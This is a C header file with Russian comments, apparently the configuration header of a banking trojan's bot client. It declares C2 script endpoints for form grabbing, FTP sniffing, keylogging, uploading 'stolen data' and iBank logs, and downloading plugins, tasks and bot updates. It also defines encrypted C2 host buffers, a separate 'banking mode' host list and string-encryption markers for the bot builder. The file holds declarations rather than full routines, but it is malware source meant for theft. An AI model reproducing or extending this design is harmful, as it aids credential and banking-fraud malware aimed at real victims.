#ifndef ConfigH
#define ConfigH
//----------------------------------------------------------------------------

#include <windows.h>
#include "Strings.h"


//****************************************************
//  Информация о версии бота
//  Обязательный формат:
//
//  Major.Minor.Release
//  1.0.0
//
//  Обязательно придерживаться такого формата!!
//****************************************************
#define BOT_VERSION "1.3.0"

#define BOT_VERSION_HEADER      "_BT_VER:"
#define BOT_VERSION_HEADER_HASH 0xFA6E639F /* _BT_VER: */
#define BOT_VERSION_HEADER_SIZE 8


//****************************************************
//  Определите имя DEBUGCONFIG если необходимо что-бы
//  бот использовал отладочные настройки
//****************************************************
#if !defined(DEBUGCONFIG) && defined(DEBUGBOT)
	#define DEBUGCONFIG
#endif



//****************************************************
//  Включение настройки использования отдельного
//  префикса в режиме BANKING
//
//  В сборке bot.plug опция отключена
//****************************************************
#ifndef BOTPLUG
    //#define USE_BANKING_PREFIX
#endif


//****************************************************
//  Опция включает использование отдельных хостов в
//  режиме BANKING
//****************************************************
//#define USE_BANKING_HOSTS



// Константы, номера скриптов

#define SCRIPT_FORM_GRABBER  1  /* Скрипт отправки данных HTML форм */
#define SCRIPT_TASK          2  /* Скрипт загрузки задач */
#define SCRIPT_PLUGINS       3  /* Скрипт загрузки плагинов */
#define SCRIPT_FTP_SNIFFER   4  /* Скрипт отправки данных FTP снифффера */
#define SCRIPT_FIRST_INFO    5  /* Скрипт отправки дданных о системе */
#define SCRIPT_GRABBER       6  /* Скрипт отправки награбленных данных */
#define SCRIPT_CAB           7  /* Скрипт отправки награбленных данных */
#define SCRIPT_HUNTER        8  /* Адрес скрипта получения команд модуля Hunter */
#define SCRIPT_COMMENT       9  /* Адрес скрипта получения команд модуля Hunter */
#define SCRIPT_PLUGINS_LIST  10 /* Адрес скрипта получения информации о доступных плагинах на сервере */
#define SCRIPT_KEYLOGGER     11 /* Адрес скрипта, куда будут передаваться данные кейлогера */
#define SCRIPT_REMOTE_LOG    12 /* Скрипт удалённого логирования */
#define SCRIPT_UPDATE_HOSTS  13 /* Скрипт обновления списка хостов */
#define SCRIPT_UPDATE_BOT    14 /* Скрипт  автоматического обновления ботов */
#define SCRIPT_IBANK_LOG     15 /* Скрипт приёма логов ибанка */
#define SCRIPT_PLUGIN        16 /* Скрипт получения адеса одного плагина */


// Максимальные размеры массивов с данными
#define MAX_MAINHOSTS_BUF_SIZE 500 /* Размер буфера хранения ссылок */
#define MAX_BANKHOSTS_BUF_SIZE 500 /* размер буфера хранения хостов отправки кабов */
#define MAX_PASSWORD_SIZE      64  /* Размер буфера хранения основного пароля */
#define MAX_PREFIX_SIZE        20  /* Размер буфера для префикса бота */
#define MAX_DELAY_SIZE         8   /* Буфер для хранения задержки */
#define MAX_BOT_PLUG_NAME_SIZE 100 /* Буфер для хранения имени ботплага */
#define MAX_SESSION_PASSW_SIZE 10  /* Размер буфера хранения пароля шифрования данных */



// Имена параметров

#define BOTPARAM_PREFIX        "BOT_UID"
#define BOTPARAM_MAINHOSTS     "ALL_HOSTS_BUFFER\0\0"
#define BOTPARAM_BANKHOSTS     "CAB_HOSTS_BUFFER\0\0"
#define BOTPARAM_DELAY         "DELAY_"
#define BOTPARAM_MAINPASSWORD  "MAIN_PASSWORD"
#define BOTPARAM_PLUG_NAME     "PLUG_NAME"
#define BOTPARAM_SESSION_PASSW "ESTR_PASS_"



// Маркеры начала и окончания блока шифрованных строк
// Билдер бота найдёт первое вхождение маркера начала
// и зашифрует все строки до маркера окончания
#define ENCRYPTED_STRINGS_BEGIN "CSBEGIN"
#define ENCRYPTED_STRINGS_END   "CSEND"



//Хэши имён параметров

#define BOTPARAM_HASH_BANKHOSTS  0x998F4828 /* CAB_HOSTS_BUFFER */
#define BOTPARAM_HASH_MAINHOSTS  0xE98F4C1C /* ALL_HOSTS_BUFFER */
#define BOTPARAM_HASH_PASSWORD   0x618ADDBE /* MAIN_PASSWORD */
#define BOTPARAM_HASH_DELAY      0x59906EFB /* DELAY_ */

// Настройки шифрования параметров
#ifndef DEBUGCONFIG
	#define BOTPARAM_ENCRYPTED_MAINHOSTS true
	#define BOTPARAM_ENCRYPTED_BANKHOSTS true
	#define BOTPARAM_ENCRYPTED_PREFIX    true
	#define BOTPARAM_ENCRYPTED_PASSWORD  true
#else
	#define BOTPARAM_ENCRYPTED_MAINHOSTS false
	#define BOTPARAM_ENCRYPTED_BANKHOSTS false
	#define BOTPARAM_ENCRYPTED_PREFIX    false
	#define BOTPARAM_ENCRYPTED_PASSWORD  false
#endif


#define DEFAULT_DELAY  10 /* Задержка по умолчанию */


//--------------------------------------------------------
//  Им сигнального файла режима Банк
//  Если файл с таким именем будет лежать в директории
//  Application Data...дополнить коментарий
//--------------------------------------------------------
#ifdef USE_BANKING_PREFIX
	const static char BANKING_SIGNAL_FILE[] = {'p','r','f','b','n','s','m','t','.','i','n','i', 0};
#endif
const DWORD BANKING_SIGNAL_FILE_HASH = 0x2709A4B5; /* prfbnsmt.ini */


//--------------------------------------------
//  GetBotVersion - Функция возвращает строку
//                  с версией бота
//--------------------------------------------
PCHAR GetBotVersion();


//--------------------------------------------
//  GetBotHosts
// Функция возвращает указатель на
// массив хостов бота
//--------------------------------------------
PCHAR GetBotHosts();

//------------------------------------------------------------------
//  GetActiveHost - Функция возвращает первый рабочий хост
//					В случае успеха функция возвращает новую строку
//------------------------------------------------------------------
//PCHAR GetActiveHost();
string GetActiveHost(bool CheckBankingMode = true);


//------------------------------------------------------------------
//  SaveHostsToFile - Функция записывает носты в файл
//------------------------------------------------------------------
void SaveHostsToFile(const char* FileName);

//------------------------------------------------------------------
//  SavePrefixToFile - Функция записывает префикс в файл
//------------------------------------------------------------------
void SavePrefixToFile(const char* FileName);

//------------------------------------------------------------------
//  LoadPrefixFromFile - Функция загружает префикс из файла
//------------------------------------------------------------------
string LoadPrefixFromFile(const char* FileName);


//-------------------------------------------------------------------
//  IsMainHost - функция возвращает истину если
//  указанный хост принадлежит массиву основных хостов бота
//-------------------------------------------------------------------
bool IsMainHost(const char* Host);

//------------------------------------------------------------------
//  GetActiveHostFromBuf - Функция возвращает хост из буфера
//
//  Hosts - Указатель на последовательность зашифрованных строк
//          завершающиеся пустой строкой. сСьроки должны разде
//			ляться нулём.
//
//  EmptyArrayHash - Хэш идентифицирующий пустые данные массива.
//                   Используется для ситуации когда данные в
//  				 массив вшиваются
//
//  Encrypted - Указание того, что данные зашифрованы
//------------------------------------------------------------------
PCHAR GetActiveHostFromBuf(PCHAR Hosts, DWORD EmptyArrayHash);
string GetActiveHostFromBuf2(const char* Hosts, DWORD EmptyArrayHash, bool Encrypted);



// Функция возвращает пароль для криптования принимаемых/отправляемых данных
PCHAR GetMainPassword();
string GetMainPassword2(bool NotNULL = false);

//------------------------------------------------------------------------
// GetSessionPassword - Функция возвращает указатель на пароль для
//                      шифрования внутренних данных
//------------------------------------------------------------------------
PCHAR GetSessionPassword();

//------------------------------------------------------------------------
//  GetBotScriptURL - Функция возвращает полный адрес указанного скрипта
//  Если указать Path то будет использован этот путь, в противном случае
//  будет использоваться путь прописанный для скрипта с номером Script
//
//  CheckBankingMode - Указание проверять режим хостов. Если
//					   CheckBankingMode == true и бот находится в режиме
//				       Banking, то хосты будут браться из массива хостов
//					   Banking админок
//------------------------------------------------------------------------
PCHAR GetBotScriptURL(DWORD Script, PCHAR Path = NULL, bool CheckBankingMode = true);



//-----------------------------------------------------
//  GetBankingScriptURL-  Функция возвращает адрес
//		скрипта с проверкой включенного режима Banking
//-----------------------------------------------------
//string GetBankingScriptURL(DWORD Script, bool CheckBankingMode);



// Функция генерирует случайноре имя скрипта
// Exts - массив расширений, заканчивающихся нулевым указателем
PCHAR GenerateRandomScript(DWORD Min1, DWORD Max1, DWORD Min2, DWORD Max2, PCHAR *Exts);

int GetDelay();

string GetPrefix(bool CheckBankingMode = false);



void SetBankingMode(bool IsBanking = true);
bool IsBankingMode();


//------------------------------------------------------------------------
//  Идентификаторы параметров бота
//------------------------------------------------------------------------
#define BOT_PARAM_PREFIX       1   /* Префикс бота  */
#define BOT_PARAM_HOSTS        2   /* Хосты бота */
#define BOT_PARAM_KEY          3   /* Ключ ши фрования */
#define BOT_PARAM_DELAY        4   /* Время отстука */
#define BOT_PARAM_BOTPLUGNAME  5   /* Имя ботплага */
#define BOT_PARAM_BANKINGHOSTS 6   /* Хосты отстука в BANKING режиме */



//------------------------------------------------------------------------
//  GetBotParameter - Функция возвращает парметр бота
//
//  ParamID - Идентификатор параметра
//
//  Buffer - Буфер, куда будет записано значение
//
//  BufSize -  Размер буфера
//
//  Результат: Функция вернёт количество записанных в буфер байт
//			   Если передать в качестве буфера NULL то функция вернёт
// 			   размер данных.
//------------------------------------------------------------------------
DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize);


//------------------------------------------------------------------------
//  SetBotParameter - Функция устанавливает параметр бота
//
//  ParamID -  Идентификатор парметра
//
//  Param - Строка оканчивающаяся нулём со значением параметра
//          Если устанавливается параметр Хосты (BOT_PARAM_HOSTS)
//			то принимается набор хостов которые отделены друг от друга
//			нулевым символом, после последнего хоста должно стоять два
//			нулевых символа. т.е. буфер должен заканчиваться пустой
//			строкой. Каждый хост должен быть зашифрован.
//			Все парметры кроме Времени отстука должны быть шифрованными
//------------------------------------------------------------------------
BOOL WINAPI SetBotParameter(DWORD ParamID, PCHAR Param);


//описана в BotCore.h
extern char BOT_UID[128];



//-------------------------------------------------------
// Функция проверяет работоспособность указанного хоста
//-------------------------------------------------------
bool CheckHost(const char* Host);



//----------------------------------------------------------------------------
#endif

